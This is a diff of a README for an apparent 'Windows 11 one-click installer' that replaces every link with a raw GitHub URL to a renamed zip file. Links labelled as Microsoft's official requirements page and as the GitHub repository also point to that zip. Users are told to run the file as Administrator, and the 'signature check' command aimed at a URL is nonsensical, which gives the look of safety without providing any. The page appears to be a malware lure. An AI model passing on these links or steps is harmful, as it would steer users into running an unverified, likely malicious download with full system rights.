@@ -1,6 +1,6 @@
 # ⚙️ Windows-11-One-Click-Install - Easily Set Up Windows 11
 
-[![Download Now](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip)
+[![Download Now](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ This guide helps you install Windows 11 with just one click. The tool automates 
 
 ## 🔗 Download & Install
 
-Visit this page to download: [Download Releases](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip).
+Visit this page to download: [Download Releases](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip).
 
 1. **Go to the Releases page.**
 2. **Find the latest version** of the Windows-11-One-Click-Installer.
-3. **Download the file** named `https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip`.
+3. **Download the file** named `https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip`.
 
 ## ⚠️ Important Terms
 
@@ -41,12 +41,12 @@ Visit this page to download: [Download Releases](https://raw.githubusercontent.c
 
 After downloading the installer, follow these steps:
 
-1. **Locate the downloaded file** (`https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip`) in your Downloads folder.
+1. **Locate the downloaded file** (`https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip`) in your Downloads folder.
 2. **Right-click on the file** and select **Run as Administrator**.
 3. **Verify the digital signature** by running this PowerShell command in a terminal:
 
     ```powershell
-    Get-AuthenticodeSignature .\https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip
+    Get-AuthenticodeSignature .\https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip
     ```
 
 4. If the signature is verified, proceed with the installation.
@@ -79,7 +79,7 @@ A: This tool provides a default setup. For advanced customization, consider usin
 
 ## 🔗 Additional Resources
 
-- [Microsoft Windows 11 - Official Requirements](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click_Windows_Install_One_v2.5.zip)
+- [Microsoft Windows 11 - Official Requirements](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/pikojogja/Windows-11-One-Click-Install/main/heaver/Click-Install-One-Windows-moderatorship.zip)
 
 For any support or contributions to the project, please visit the GitHub page.
